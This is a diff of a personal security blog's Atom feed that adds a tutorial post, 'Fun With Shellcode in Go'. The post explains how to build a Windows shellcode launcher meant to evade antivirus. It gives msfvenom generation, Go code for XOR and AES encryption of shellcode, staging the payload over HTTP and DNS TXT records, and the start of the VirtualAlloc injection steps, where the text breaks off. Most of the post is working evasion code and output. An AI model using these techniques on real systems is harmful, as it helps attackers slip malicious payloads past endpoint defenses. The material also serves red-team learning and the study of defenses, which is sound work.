@@ -1,4 +1,707 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-05-10T12:02:50-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">m1kemu-sec</title><subtitle>My mostly security-focused thoughts, projects, and rants</subtitle><author><name>Mike Music</name></author><entry><title type="html">Defeating Antivirus with Python</title><link href="http://localhost:4000/python/evasion/shellcode/2020/05/07/python-av-evasion/" rel="alternate" type="text/html" title="Defeating Antivirus with Python" /><published>2020-05-07T00:00:00-04:00</published><updated>2020-05-07T00:00:00-04:00</updated><id>http://localhost:4000/python/evasion/shellcode/2020/05/07/python-av-evasion</id><content type="html" xml:base="http://localhost:4000/python/evasion/shellcode/2020/05/07/python-av-evasion/">&lt;p&gt;Antivirus (AV) has advanced a lot, even in the short years that I’ve spent attempting to evade it. Tricks that I’ve used 2 years ago to get a shell on a endpoint just don’t work anymore. Because of this, I’ve had to resort to trying different methods of shellcode execution on hosts. One thing I’ve noticed is that some common AV tools fail to detect shellcode injection from Pyinstalled binaries. I don’t have a solid explanation for this, but I do have some theories based on the scarce information available on detection logic for specific AV/EDR.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-19T17:31:18-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">m1kemu-sec</title><subtitle>My mostly security-focused thoughts, projects, and rants</subtitle><author><name>Mike Music</name></author><entry><title type="html">Fun With Shellcode in Go</title><link href="http://localhost:4000/security/2020/07/19/go-shellcode-fun/" rel="alternate" type="text/html" title="Fun With Shellcode in Go" /><published>2020-07-19T00:00:00-04:00</published><updated>2020-07-19T00:00:00-04:00</updated><id>http://localhost:4000/security/2020/07/19/go-shellcode-fun</id><content type="html" xml:base="http://localhost:4000/security/2020/07/19/go-shellcode-fun/">&lt;p&gt;I’ve started to dabble in Go a lot over the last few months, and I’m starting to see where it will fit in with Python and C# in my arsenal of commonly used programming languages for offensive tools. Thus far, I’ve developed a few shellcode Launchers that also include some simple AV/EDR evasion features. In my testing, these features have been pretty successful in evading most AV. If you’ve read my previous post on Python shellcode injection, this will be pretty similar. However, Go is generally more pleasant to work with when developing a Windows shellcode Launcher on Linux, so it won’t be as complex as the Python method I wrote about.&lt;/p&gt;
+
+&lt;p&gt;Before getting into the specifics of the Launcher techniques, here’s a VirusTotal score for a couple of Launcher variants:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Launcher with plaintext shellcode embedded.
+&lt;img src=&quot;/assets/images/go_shellcode_5.PNG&quot; alt=&quot;VirusTotal Results&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Launcher with XOR encrypted shellcode embedded (same score as unencrypted).
+&lt;img src=&quot;/assets/images/go_shellcode_5.PNG&quot; alt=&quot;VirusTotal Results&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Launcher that pulls down XOR encrypted shellcode via HTTPS.
+&lt;img src=&quot;/assets/images/go_shellcode_6.PNG&quot; alt=&quot;VirusTotal Results&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Launcher that pulls down shellcode via HTTPS and is packed with UPX.
+&lt;img src=&quot;/assets/images/go_shellcode_7.PNG&quot; alt=&quot;VirusTotal Results&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;As you can see, the Launcher works pretty well, and it’s very simple. Nice.&lt;/p&gt;
+
+&lt;h2 id=&quot;purpose&quot;&gt;Purpose&lt;/h2&gt;
+
+&lt;p&gt;This post will cover some fun shellcode-related Launcher techniques for a shellcode Launcher written in Go. The goal is ultimately to construct a Launcher that defeats a decent number of AV/EDR technologies to launch well-known shellcode. I’ll cover:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;2 Shellcode encryption methods (AES, Simple XOR)&lt;/li&gt;
+  &lt;li&gt;3 Shellcode “acquisition” methods (HTTP, DNS, Embedded)&lt;/li&gt;
+  &lt;li&gt;1 Shellcode execution method&lt;/li&gt;
+  &lt;li&gt;A few other miscellaneous techniques&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;As with all of my blog posts, my primary motivation for doing this is to learn new techniques myself or to solidify my understanding of techniques I’ve used in the past. None of these techniques are groundbreaking or overly complex, and they’re really just a combination of other well known techniques that are widely known. But the simplicity of this is what makes it great.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;As with all of my code/documentation/articles, this is not to be used maliciously. Use this information for good, and follow all laws of your Nation/State/County/City/Home.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-started&quot;&gt;Getting Started&lt;/h2&gt;
+
+&lt;h3 id=&quot;development-environment&quot;&gt;Development Environment&lt;/h3&gt;
+
+&lt;p&gt;You’re going to need a few things to get started. I’ll include what you need, why you need it, and some resources below.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Windows 10 or Server 2016 VM: Used for testing the Launcher.&lt;/li&gt;
+  &lt;li&gt;Kali Linux VM: Has Metasploit pre-installed for shellcode generation, Go development.&lt;/li&gt;
+  &lt;li&gt;Go: Installed on your development host, and a novice understanding of the language itself.&lt;/li&gt;
+  &lt;li&gt;BASH: I’ll walk through a build script for the Go Launcher, which will require BASH and some novice BASH knowledge.&lt;/li&gt;
+  &lt;li&gt;A text editor: Pick whatever you prefer. I’ll be using vim and the Python Idle IDE.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Resources:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Legit, temporary Windows 10 VMs: &lt;a href=&quot;https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/&quot;&gt;Windows 10&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Kali Linux: &lt;a href=&quot;https://www.kali.org/&quot;&gt;Kali&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Go Website: &lt;a href=&quot;https://golang.org/&quot;&gt;Golang&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;generating-shellcode&quot;&gt;Generating Shellcode&lt;/h3&gt;
+
+&lt;p&gt;For test purposes, generate generic Windows shellcode for x64 architecture using msfvenom.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -a x64 --platform windows -p windows/x64/exec cmd=calc.exe -f raw -o calc_x64.bin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;encrypting-the-shellcode&quot;&gt;Encrypting the Shellcode&lt;/h2&gt;
+
+&lt;p&gt;Encrypting the shellcode is the first step towards getting the shellcode onto the target and executed without being detected. I’ll demonstrate two encryption methods in Go, but there are tons of pre-built encryption packages, and tons to be built.&lt;/p&gt;
+
+&lt;h3 id=&quot;simple-xor&quot;&gt;Simple XOR&lt;/h3&gt;
+
+&lt;p&gt;This method applies a simple XOR encryption algorithm to the shellcode (plaintext) using a provided key. In the case of this example, my key is ‘0123456789123456’ and my shellcode is the binary contents of a file containing ‘hello world’.&lt;/p&gt;
+
+&lt;p&gt;First, define the main package and import a few standard Go packages.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;io/ioutil&quot;&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;os&quot;&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;encoding/base64&quot;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Next, add the XOR encryption function. This function will take the key and plaintext bytes as input and return the ciphertext in byte format.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func EncryptXOR(plaintext, key []byte) []byte {
+  ciphertext := make([]byte, len(plaintext))
+  for i := 0; i &amp;lt; len(plaintext); i++ {
+    ciphertext[i] = plaintext[i] ^ key[i % len(key)]
+  }
+
+  return ciphertext
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finally, implement the main function, which will perform both encryption and decryption for demonstration. Note that the shellcode file and key are being passed as command line arguments (args[1], args[2]). I’m also reading the shellcode file using ioutil.ReadFile, and printing some of the variables out for debugging purposes.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func main() {
+  args := os.Args
+  sc_file := args[1]
+  key := args[2]
+
+  fmt.Println(&quot;\n[!] XOR Encryption&quot;)
+
+  sc, _ := ioutil.ReadFile(sc_file)
+  fmt.Println(&quot;[*] Shellcode bytes:&quot;, sc)
+  fmt.Println(&quot;[*] Key:&quot;, key)
+
+  ciphertext := EncryptXOR([]byte(sc), []byte(key))
+  fmt.Println(&quot;[*] Ciphertext:&quot;, ciphertext)
+
+  ciphertext_b64 := base64.StdEncoding.EncodeToString([]byte(ciphertext))
+
+  fmt.Println(&quot;[+] Final message:&quot;, ciphertext_b64)
+
+  ciphertext, _ = base64.StdEncoding.DecodeString(ciphertext_b64)
+  fmt.Println(&quot;[*] Message decoded:&quot;, ciphertext)
+  plaintext := EncryptXOR(ciphertext, []byte(key))
+  fmt.Println(&quot;[+] Decrypted:&quot;, plaintext)
+
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Save this as a .go file (ex: xor.go), set your GOOS and GOARCH variables (ex: export GOOS=linux; export GOARCH=amd64 for 64 bit Linux), and run it with your command line args (go run xor.go “payload.bin” “0123456789123456”). You should see output similar to that shown below.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mmusic@administration:~/go_shellcode$ go run xor.go &quot;payload.bin&quot; &quot;0123456789123456&quot;  
+[!] XOR Encryption
+[*] Shellcode bytes: [104 101 108 108 111 32 119 111 114 108 100 10]
+[*] Key: 0123456789123456
+[*] Ciphertext: [88 84 94 95 91 21 65 88 74 85 85 56]
+[+] Final message: WFReX1sVQVhKVVU4
+[*] Message decoded: [88 84 94 95 91 21 65 88 74 85 85 56]
+[+] Decrypted: [104 101 108 108 111 32 119 111 114 108 100 10]
+mmusic@administration:~/go_shellcode$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This should be enough to get your shellcode past most AVs when pulling it down, and may be able to help with shellcode embedded directly in a binary.&lt;/p&gt;
+
+&lt;h3 id=&quot;aes&quot;&gt;AES&lt;/h3&gt;
+
+&lt;p&gt;Now it’s time to test out AES encryption and decryption, which is a little fancier than XOR. There will be a few extra libraries to import for this technique.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;io/ioutil&quot;&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;strings&quot;&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;os&quot;&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;crypto/aes&quot;&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;crypto/cipher&quot;&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;encoding/base64&quot;&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;time&quot;&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;math/rand&quot;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, implement some variables and functions to generate a random IV for the AES cipher. I’m using a method found &lt;a href=&quot;https://www.calhoun.io/creating-random-strings-in-go/&quot;&gt;here&lt;/a&gt; to generate the random string, which seemed to be the simplest way to do this in Go.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;const charset = &quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;
+var seeded *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
+
+func StringWithCharset(length int, charset string) string {
+  b := make([]byte, length)
+  for i := range b {
+    b[i] = charset[seeded.Intn(len(charset))]
+  }
+  return string(b)
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Next are the actual AES encryption and decryption functions. I’m using CFB mode for encryption, so I’m not performing any padding. This functionality is provided by the crypto/aes and crypto/cipher packages.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func EncryptAES(ciphertext, plaintext, key, iv []byte) {
+  aesBlockEncrypter, _ := aes.NewCipher([]byte(key))
+  aesEncrypter := cipher.NewCFBEncrypter(aesBlockEncrypter, iv)
+  aesEncrypter.XORKeyStream(ciphertext, plaintext)
+}
+
+func DecryptAES(plaintext, ciphertext, key, iv []byte) {
+  aesBlockDecrypter, _ := aes.NewCipher([]byte(key))
+  aesDecrypter := cipher.NewCFBDecrypter(aesBlockDecrypter, iv)
+  aesDecrypter.XORKeyStream(plaintext, ciphertext)
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finally, add the main function. Let me break down what’s going on in this function.&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Assign the shellcode file path and encryption key to variables.&lt;/li&gt;
+  &lt;li&gt;Create a random IV 16 characters long.&lt;/li&gt;
+  &lt;li&gt;Read the shellcode bytes from the file (plaintext).&lt;/li&gt;
+  &lt;li&gt;Create the ciphertext using the plaintext, key, and IV.&lt;/li&gt;
+  &lt;li&gt;Base64 encode the ciphertext and IV.&lt;/li&gt;
+  &lt;li&gt;Create a final “message” of format [ciphertext base64::IV base64].&lt;/li&gt;
+  &lt;li&gt;Perform parsing and decryption of this message to confirm functionality of crypto functions.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func main() {
+  args := os.Args
+  sc_file := args[1]
+  key := args[2]
+
+  iv_str := StringWithCharset(16, charset)
+  iv := []byte(iv_str)[:aes.BlockSize]
+
+  fmt.Println(&quot;[!] AES Encryption&quot;)
+
+  sc, _ := ioutil.ReadFile(sc_file)
+  fmt.Println(&quot;[*] Shellcode bytes:&quot;, sc)
+  fmt.Println(&quot;[*] Key:&quot;, key)
+  fmt.Println(&quot;[*] IV:&quot;, iv)
+
+  ciphertext := make([]byte, len(sc))
+  EncryptAES(ciphertext, []byte(sc), []byte(key), iv)
+  fmt.Println(&quot;[+] Ciphertext:&quot;, ciphertext)
+
+  ciphertext_b64 := base64.StdEncoding.EncodeToString([]byte(ciphertext))
+  iv_b64 := base64.StdEncoding.EncodeToString([]byte(iv))
+
+  s := []string{ciphertext_b64, iv_b64}
+  msg := strings.Join(s, &quot;::&quot;)
+  fmt.Println(&quot;[+] Final message:&quot;, msg)
+
+  msg_b64_split := strings.Split(msg, &quot;::&quot;)
+  ciphertext_b64 = msg_b64_split[0]
+  iv_b64 = msg_b64_split[1]
+  fmt.Println(&quot;[*] Ciphertext base64:&quot;, ciphertext_b64)
+  fmt.Println(&quot;[*] IV base64:&quot;, iv_b64)
+
+  ciphertext, _ = base64.StdEncoding.DecodeString(ciphertext_b64)
+  iv, _ = base64.StdEncoding.DecodeString(iv_b64)
+  fmt.Println(&quot;[*] Ciphertext bytes:&quot;, ciphertext)
+  fmt.Println(&quot;[*] IV bytes:&quot;, iv)
+
+  plaintext := make([]byte, len(ciphertext))
+  DecryptAES(plaintext, ciphertext, []byte(key), iv)
+  fmt.Println(&quot;[+] Decrypted:&quot;, plaintext)
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The goal of all of this code put together is to generate a final message that can be hosted almost anywhere to be pulled by a shellcode Launcher, then decrypted and injected. Now, save this code to a file (aes.go for example) and run it to test.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mmusic@administration:~/go_shellcode$ go run aes.go &quot;payload.bin&quot; &quot;0123456789123456&quot;
+[!] AES Encryption
+[*] Shellcode bytes: [104 101 108 108 111 32 119 111 114 108 100 10]
+[*] Key: 0123456789123456
+[*] IV: [114 111 111 55 120 53 52 122 54 122 116 108 57 104 109 112]
+[+] Ciphertext: [94 169 227 41 175 103 105 182 144 23 230 211]
+[+] Final message: XqnjKa9nabaQF+bT::cm9vN3g1NHo2enRsOWhtcA==
+[*] Ciphertext base64: XqnjKa9nabaQF+bT
+[*] IV base64: cm9vN3g1NHo2enRsOWhtcA==
+[*] Ciphertext bytes: [94 169 227 41 175 103 105 182 144 23 230 211]
+[*] IV bytes: [114 111 111 55 120 53 52 122 54 122 116 108 57 104 109 112]
+[+] Decrypted: [104 101 108 108 111 32 119 111 114 108 100 10]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;acquiring-the-shellcode&quot;&gt;Acquiring the Shellcode&lt;/h2&gt;
+
+&lt;p&gt;With two encryption methods tested, and the final message containing the ciphertext formatted, it’s time to download the message. There are endless ways to do this, but I’ll cover two simple and common ones: HTTP/S and DNS.&lt;/p&gt;
+
+&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
+
+&lt;p&gt;Pulling the message down using HTTP is an obvious first choice for a few reasons. It’s simple, blending in with other HTTP traffic provides some traffic obfuscation, and it’s reliable due to the need for outbound HTTP traffic in most networks. The big downside with this method is the need to add proxy configuration to the Launcher if the target network is using a web proxy.&lt;/p&gt;
+
+&lt;p&gt;The code for an HTTP download in Go is pretty simple. First, define the main package and import some packages.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;net/http&quot;&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;io/ioutil&quot;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, define the main function. This code downloads the download_me.txt content from http://127.0.0.1:8080 and sets a custom user agent for the GET request.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func main() {
+  url := &quot;http://127.0.0.1:8080/download_me.txt&quot;
+  user_agent := &quot;Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&quot;
+
+  req, _ := http.NewRequest(&quot;GET&quot;, url, nil)
+  req.Header.Set(&quot;User-Agent&quot;, user_agent)
+  client := &amp;amp;http.Client{}
+  resp, _ := client.Do(req)
+
+  defer resp.Body.Close()
+
+  content, _ := ioutil.ReadAll(resp.Body)
+
+  fmt.Println(string(content))
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Save the code to http.go and run give it a test run while hosting an http server on port 8080 locally using something like ‘python -m SimpleHTTPServer 8080’. Make sure download_me.txt exists (in my case, it contains the aes.go output from earlier).&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mmusic@administration:~/go_shellcode$ go run ./http.go
+XhGpM70PFGJamh0q::djg1NnM3YWdmeDFxaDJrbQ==
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mmusic@administration:~/go_shellcode$ python -m SimpleHTTPServer 8080
+Serving HTTP on 0.0.0.0 port 8080 ...
+127.0.0.1 - - [12/Jul/2020 12:50:26] &quot;GET /download_me.txt HTTP/1.1&quot; 200 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;dns&quot;&gt;DNS&lt;/h3&gt;
+
+&lt;p&gt;Pulling down shellcode via DNS is a little more fun, and versatile. Most systems will allow outbound DNS traffic, and inspection of DNS requests and responses is lacking in most organizations. DNS also doesn’t require fancy proxy configurations that may be required when using HTTP. In the example I’ll show, I’m using DNS TXT records to host the message output from aes.go. To host the shellcode in a TXT record, I’ll be using a Python project, &lt;a href=&quot;https://github.com/samuelcolvin/dnserver&quot;&gt;dnsserver&lt;/a&gt; for my dns server. Just download this repo, install the dependencies, and run this:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT=5053 ZONE_FILE='./example_zones.txt' ./dnserver.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Note: Because I’m using a local DNS server, the Go code will be a little different than what would actually be used in an engagement. I’ll point out that code in a moment.&lt;/p&gt;
+
+&lt;p&gt;I’ll be adding my shellcode/ciphertext/message to the example.com TXT record. In an actual engagement, you would end up purchasing a domain and creating a TXT record with the contents using your domain registrar. Add the output of aes.go (the shellcode + iv message) to the TXT record that you’ll be pulling down. In my case, that’s for example.com. I’m adding it to the example_zones.txt file for using with dnsserver.py.&lt;/p&gt;
+
+&lt;p&gt;Here’s my example_zones.txt file.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mmusic@administration:~/dnserver$ cat example_zones.txt
+example.com  A       1.2.3.4
+example.com  CNAME   whatever.com
+example.com  MX      [&quot;whatever.com.&quot;, 5]
+example.com  MX      [&quot;mx2.whatever.com.&quot;, 10]
+example.com  MX      [&quot;mx3.whatever.com.&quot;, 20]
+example.com  NS      ns1.whatever.com.
+example.com  NS      ns2.whatever.com.
+example.com  SOA     [&quot;ns1.example.com&quot;, &quot;dns.example.com&quot;]
+example.com  TXT    dAD2Bb5Y4U5JGKxm::cHluaHU3OXE2Z2l1eHc5dA==
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then I start the dns server.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 ./dnserver.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Next, I created the dns.go file and added the package defition and imports. There are a few more imports this time around.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import (
+  &quot;fmt&quot;
+  &quot;context&quot;
+  &quot;net&quot;
+  &quot;time&quot;
+  &quot;strings&quot;
+)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now I create the main function. Here’s an overview of what’s going on here.&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Set the domain that contains the TXT record with the aes.go output.&lt;/li&gt;
+  &lt;li&gt;Create a custom Resolver with a Dialer that directs to 127.0.0.1:5053 (References &lt;a href=&quot;https://golang.org/pkg/net/#Resolver&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;https://stackoverflow.com/questions/59889882/specifying-dns-server-for-lookup-in-go&quot;&gt;here&lt;/a&gt;). This points the LookupTXT function to the locally running DNS server (dnsserver.py). &lt;strong&gt;This code will not be required in a finalized Launcher, as it will not use a local DNS server.&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;Request the TXT record.&lt;/li&gt;
+  &lt;li&gt;Parse the TXT record (split on ‘::’).&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func main() {
+  domain := &quot;example.com&quot;
+
+  r := &amp;amp;net.Resolver{
+    PreferGo: true,
+    Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
+      d := net.Dialer {
+        Timeout: time.Millisecond * time.Duration(10000),
+      }
+      return d.DialContext(ctx, &quot;udp&quot;, &quot;127.0.0.1:5053&quot;)
+    },
+  }
+
+  txt_records, _ := r.LookupTXT(context.Background(), domain)
+  fmt.Println(&quot;[+] TXT Record Data:&quot;, txt_records)
+
+  msg_b64 := txt_records[0]
+  msg_b64_split := strings.Split(msg_b64, &quot;::&quot;)
+
+  ciphertext_b64 := msg_b64_split[0]
+  iv_b64 := msg_b64_split[1]
+
+  fmt.Println(&quot;[+] Ciphertext:&quot;, ciphertext_b64)
+  fmt.Println(&quot;[+] IV :&quot;, iv_b64)
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Add this code to dns.go, and run it. You should see the content of the TXT record containing the shellcode.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mmusic@administration:~/go_shellcode$ go run dns.go
+[+] TXT Record Data: [dAD2Bb5Y4U5JGKxm::cHluaHU3OXE2Z2l1eHc5dA==]
+[+] Ciphertext: dAD2Bb5Y4U5JGKxm
+[+] IV : cHluaHU3OXE2Z2l1eHc5dA==
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;embedded&quot;&gt;Embedded&lt;/h3&gt;
+
+&lt;p&gt;The final method of shellcode acquisition is not really all that fun. It’s just embedding the encrypted shellcode into the Launcher itself for decryption. The point of including this method was really to test a ‘baseline’ against VirusTotal. I’m not going to provide demonstration code, but to embed the encrypted shellcode in your Launcher, just grab the base64 output from aes.go and assign it to a variable in the Launcher.&lt;/p&gt;
+
+&lt;h2 id=&quot;running-the-shellcode&quot;&gt;Running the Shellcode&lt;/h2&gt;
+
+&lt;p&gt;The final step for a basic shellcode Launcher in Go is actually injecting the shellcode. This will be accomplished using the method outlined &lt;a href=&quot;https://github.com/Ne0nd0g/go-shellcode/blob/master/cmd/CreateThread/main.go&quot;&gt;here&lt;/a&gt;. This involves a few steps:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Use VirtualAlloc to allocate memory&lt;/li&gt;
+  &lt;li&gt;Use RtlCopyMemory to move the downloaded shellcode to the allocated memory region&lt;/li&gt;
